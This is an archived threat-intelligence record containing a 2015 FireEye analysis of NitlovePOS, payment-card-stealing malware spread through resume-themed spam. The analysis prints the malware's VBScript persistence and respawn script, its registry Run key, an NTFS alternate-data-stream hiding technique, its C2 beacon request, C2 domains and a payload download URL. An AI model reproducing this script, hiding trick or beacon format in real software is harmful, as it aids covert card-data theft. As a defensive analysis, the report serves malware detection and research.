{
    "id": "26cf316b-dfe0-40d4-a745-3eb2801b44fa",
    "created_at": "2023-01-12T15:00:02.160495Z",
    "updated_at": "2025-03-27T02:05:23.376987Z",
    "deleted_at": null,
    "sha1_hash": "51f81c5f87dd67a17ae65171493b1ba8e9767d43",
    "title": "2015-05-23 - NitlovePOS- Another New POS Malware",
    "authors": "",
    "file_creation_date": "2022-05-29T01:12:56Z",
    "file_modification_date": "2022-05-29T01:12:56Z",
    "file_size": 275972,
    "plain_text": "# NitlovePOS: Another New POS Malware\n\n**[fireeye.com/blog/threat-research/2015/05/nitlovepos_another.html](https://www.fireeye.com/blog/threat-research/2015/05/nitlovepos_another.html)**\n\n[There has been a proliferation of malware specifically designed to extract payment card information](https://www.fireeye.com/blog/threat-research/2014/10/data-theft-in-aisle-9-a-fireeye-look-at-threats-to-retailers.html)\nfrom Point-of-Sale (POS) systems over the last two years. In 2015, there have already been a\n[variety of new POS malware identified including a new Alina variant,](http://www.nuix.com/blog/alina-continues-spread-its-wings) [FighterPOS and](http://blog.trendmicro.com/trendlabs-security-intelligence/fighterpos-fighting-a-new-pos-malware-family/) [Punkey.](https://www.trustwave.com/Resources/SpiderLabs-Blog/New-POS-Malware-Emerges---Punkey/)\nDuring our research into a widespread spam campaign, we discovered yet another POS malware\nthat we’ve named NitlovePOS.\n\nThe NitlovePOS malware can capture and ex-filtrate track one and track two payment card data by\nscanning the running processes of a compromised machine. It then sends this data to a webserver\nusing SSL.\n\nWe believe the cybercriminals assess the hosts compromised via indiscriminate spam campaigns\nand instruct specific victims to download the POS malware.\n\n**Propagation**\n\nWe have been monitoring an indiscriminate spam campaign that started on Wednesday, May 20,\n2015. The spam emails referred to possible employment opportunities and purported to have a\nresume attached. The “From” email addresses were spoofed Yahoo! Mail accounts and contained\nthe following “Subject” lines:\n\nSubject: Any Jobs?\n\nSubject: Any openings?\n\n\n-----\n\nSubject: Internship\n\nSubject: Internship questions\n\nSubject: Internships?\n\nSubject: Job Posting\n\nSubject: Job questions\n\nSubject: My Resume\n\nSubject: Openings?\n\nThe email came with an attachment named CV_[4 numbers].doc or My_Resume_[4 numbers].doc,\nwhich is embedded with a malicious macro. To trick the recipient into enabling the malicious macro,\nthe document claims to be a “protected document.”\n\nIf enabled, the malicious macro will download and execute a malicious executable from\n80.242.123.155/exe/dro.exe. The cybercriminals behind this operation have been updating the\npayload. So far, we have observed:\n\ne6531d4c246ecf82a2fd959003d76cca dro.exe\n\n600e5df303765ff73dccff1c3e37c03a dro exe\n\n\n-----\n\nThese payloads beacon to the same server from which they are downloaded and receive\ninstructions to download additional malware hosted on this server. This server contains a wide\nvariety of malware:\n\n6545d2528460884b24bf6d53b721bf9e 5dro.exe\n\ne339fce54e2ff6e9bd3a5c9fe6a214ea AndroSpread.exe\n\n9e208e9d516f27fd95e8d165bd7911e8 AndroSpread.exe\n\nabc69e0d444536e41016754cfee3ff90 dr2o.exe\n\ne6531d4c246ecf82a2fd959003d76cca dro.exe\n\n600e5df303765ff73dccff1c3e37c03a dro.exe\n\nc8b0769eb21bb103b8fbda8ddaea2806 jews2.exe\n\n4d877072fd81b5b18c2c585f5a58a56e load33.exe\n\n9c6398de0101e6b3811cf35de6fc7b79 load.exe\n\nac8358ce51bbc7f7515e656316e23f8d Pony.exe\n\n3309274e139157762b5708998d00cee0 Pony.exe\n\nb3962f61a4819593233aa5893421c4d1 pos.exe\n\n6cdd93dcb1c54a4e2b036d2e13b51216 pos.exe\n\nWe focused on the “pos.exe” malware and suspected that it maybe targeted Point of Sale\nmachines. We speculate that once the attackers have identified a potentially interesting host form\namong their victims, they can then instruct the victim to download the POS malware. While we have\nobserved many downloads of the various EXE’s hosed on that server, we have only observed three\ndownloads of “pos.exe”.\n\n**Technical Analysis**\n\nWe analyzed the “pos.exe” (6cdd93dcb1c54a4e2b036d2e13b51216) binary found on the\n80.242.123.155 server. (A new version of “pos.exe” (b3962f61a4819593233aa5893421c4d1) was\nuploaded on May 22, 2015 that has exactly the same malicious behavior but with different file\nstructure.)\n\nThe binary itself is named “TAPIBrowser” and was created on May 20, 2015.\n\nFile Name            : pos.exe\n\nFile Size            : 141 kB\n\nMD5: 6cdd93dcb1c54a4e2b036d2e13b51216\n\n\n-----\n\nFile Type            : Win32 EXE\n\nMachine Type          : Intel 386 or later, and compatibles\n\nTime Stamp           : 2015:05:20 09:02:54-07:00\n\nPE Type             : PE32\n\nFile Description        : TAPIBrowser MFC Application\n\nFile Version          : 1, 0, 0, 1\n\nInternal Name          : TAPIBrowser\n\nLegal Copyright         : Copyright (C) 2000\n\nLegal Trademarks        :\n\nOriginal Filename        : TAPIBrowser.EXE\n\nPrivate Build          :\n\nProduct Name          : TAPIBrowser Application\n\nProduct Version         : 1, 0, 0, 1:\n\nThe structure of the file is awkward; it only contains three sections: .rdata, .hidata and .rsrc and the\nentry point located inside .hidata:\n\nWhen executed, it will copy itself to disk using a well-known hiding technique via NTFS Alternate\nData Streams (ADS) as:\n\n~\\Local Settings\\Temp:defrag.scr\n\nThen will create a vbs script and save it to disk, again using ADS:\n\n~\\Local Settings\\Temp:defrag.vbs\n\nBy doing this, the files are not visible in the file system and therefore are more difficult to locate and\ndetect.\n\nOnce the malware is running, the “defrag.vbs” script monitors for attempts to delete the malicious\nprocess via InstanceDeletion Event; it will re-spawn the malware if the process is terminated. Here\nis the code contained within “defrag.vbs”:\n\nSet f=CreateObject(\"Scripting.FileSystemObject\")\n\n\n-----\n\nSet W=CreateObject( WScript.Shell )\n\nDo While\n\nGetObject(\"winmgmts:Win32_Process\").Create(W.ExpandEnvironmentStrings(\"\"\"%TMP%:Defrag.scr\"\"\n-\"),n,n,p)=0\n\nGetObject(\"winmgmts:\\\\.\\root\\cimv2\").ExecNotificationQuery(\"Select * From\n__InstanceDeletionEvent Within 1 Where TargetInstance ISA 'Win32_Process' AND\nTargetInstance.ProcessID=\"&p).NextEvent\n\nif(f.FileExists(WScript.ScriptFullName)=false)then\n\nW.Run(W.ExpandEnvironmentStrings(\"cmd /C /D type nul > %TMP%:Defrag.scr\")), 0, true\n\nExit Do\n\nEnd If\n\nLoop\n\nThe malware ensures that it will run after every reboot by adding itself to the Run registry key:\n\n\\REGISTRY\\MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\\"Defrag\"\n= wscript \"C:\\Users\\ADMINI~1\\AppData\\Local\\Temp:defrag.vbs\"\n\nNitlovePOS expects to be run with the “-“ sign as argument; otherwise it won’t perform any\nmalicious actions. This technique can help bypass some methods of detection, particularly those\nthat leverage automation. Here is an example of how the malware is executed:\n\n\\LOCALS~1\\Temp:Defrag.scr\" \nIf the right argument is provided, NitlovePOS will decode itself in memory and start searching for\npayment card data. If it is not successful, NitlovePOS will sleep for five minutes and restart the\nsearching effort.\n\nNitlovePOS has three main threads:\n\n**Thread 1: SSL C2 Communications**\n\n**Thread 2: MailSlot monitoring waiting for CC.**\n\n**Thread 3: Memory Scrapping**\n\n**Thread 1: C2 Communications**\n\nNitlovePOS is configured to connect to one of three hardcoded C2 servers:\n\nsysteminfou48[.]ru\n\n\n-----\n\ninfofinaciale8h[.]ru\n\nhelpdesk7r[.]ru\n\nAll three of these domains resolve to the same IP address: 146.185.221.31. This IP address is\nassigned to a network located in St. Petersburg, Russia.\n\nAs soon as NitlovePOS starts running on the compromised system, it will initiate a callback via\nSSL:\n\nPOST /derpos/gateway.php HTTP/1.1\n\nUser-Agent: nit_love<GUID>\n\nHost: systeminfou48.ru\n\nContent-Length: 41\n\nConnection: Keep-Alive\n\nCache-Control: no-cache\n\nPragma: no-cache\n\nF.r.HWAWAWAWA\n\n<computer name>\n\n<OS Version>\n\nY\n\nThe User-Agent header contains a hardcoded string “nit_love” and the Machine GUID, which is not\nnecessarily unique but can be used as an identifier by the cybercriminals. The string\n“HWAWAWAWA” is hardcoded and may be a unique campaign identifier; the “F.r.” is calculated per\ninfected host.\n\n**Thread 2: MailSlot monitoring waiting for payment card data**\n\nA mailslot is basically a shared range of memory that can be used to store data; the process\ncreating the mailslot acts as the server and the clients can be other hosts on the same network,\nlocal processes on the machine, or local threads in the same process.\n\n\n-----\n\nNitlovePOS uses this feature to store payment card information; the mailslot name that is created\ncomes as a hardcoded string in the binary (once de-obfuscated);\n\n\"\\\\.\\mailslot\\95d292040d8c4e31ac54a93ace198142\"\n\nOnce the mailslot is created, an infinite loop will keep querying the allocated space.\n\n**Thread 3: Memory Scrapping**\n\nNitlovePOS scans running processes for payment data and but will skip System and “System Idle\nProcess.” It will try to match track 1 or track 2 data and, if found, will write the data into the mailslot\ncreated by Thread 2. This information is then sent via POST it to the C2 using SSL, which makes\nnetwork-level detection more difficult.\n\n**Possible Control Panel**\n\nDuring our research we observed what appears to be a test control panel on a different, but\nprobably related, server that matches with NitlovePOS. This panel is called “nitbot,” which is similar\nto the “nit_love” string found in the binary and was located in a directory called “derpmo” which is\nsimilar to the “derpos” used in this case.\n\nThe information contained in the NitlovePOS beacon matches the fields that are displayed in the\nNitbot control panel. These include the machines GIUD that is transmitted in the User-Agent header\nas well as an identifier “HWAWAWAWA,” which aligns with the “group name” that can be used by\nthe cybercriminals to track various campaigns.\n\n\n-----\n\nThe control panel contains a view that lists the “tracks,” or stolen payment card data. This indicates\nthat this panel is for malware capable of stealing data from POS machines that matches up with the\ncapability of the NitlovePOS malware.\n\n**Conclusion**\n\nEven cybercriminals engaged in indiscriminate spam operations have POS malware available and\ncan deploy it to s subset of their victims. Due to the widespread use of POS malware, they are\neventually discovered and detection increases. However, this is followed by the development of\nnew POS with very similar functionality. Despite the similarity, the detection levels for new variants\nare initially quite low. This gives the cybercriminals a window of opportunity to exploit the use of a\nnew variant.\n\nWe expect that new versions of functionally similar POS malware will continue to emerge to meet\nthe demand of the cybercrime marketplace.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2015/2015-05-23 - NitlovePOS- Another New POS Malware.pdf"
    ],
    "report_names": [
        "2015-05-23 - NitlovePOS- Another New POS Malware.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535602,
    "ts_updated_at": 1743041123,
    "ts_creation_date": 1653786776,
    "ts_modification_date": 1653786776,
    "files": {
        "pdf": "https://archive.orkl.eu/51f81c5f87dd67a17ae65171493b1ba8e9767d43.pdf",
        "text": "https://archive.orkl.eu/51f81c5f87dd67a17ae65171493b1ba8e9767d43.txt",
        "img": "https://archive.orkl.eu/51f81c5f87dd67a17ae65171493b1ba8e9767d43.jpg"
    }
}